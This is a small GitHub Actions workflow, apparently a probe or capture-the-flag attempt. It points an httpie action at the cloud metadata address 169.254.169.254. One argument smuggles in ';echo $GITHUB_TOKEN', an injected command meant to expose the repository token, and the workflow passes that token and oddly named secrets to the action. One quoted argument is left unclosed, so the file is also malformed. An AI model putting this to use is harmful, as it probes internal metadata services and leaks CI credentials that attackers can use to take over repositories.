workflow "Call external API" {
  on = "push"
  resolves = ["Call httpbin"]
}

action "Call httpbin" {
  uses = "swinton/httpie.action@master"
  args = ["GET", "169.254.169.254", ";echo $GITHUB_TOKEN]
  secrets = [
    "flag01239",
    "rojanwashere",
    "GITHUB_TOKEN",
  ]
  env = {
    JAKEa = "1231ok"
  }
}
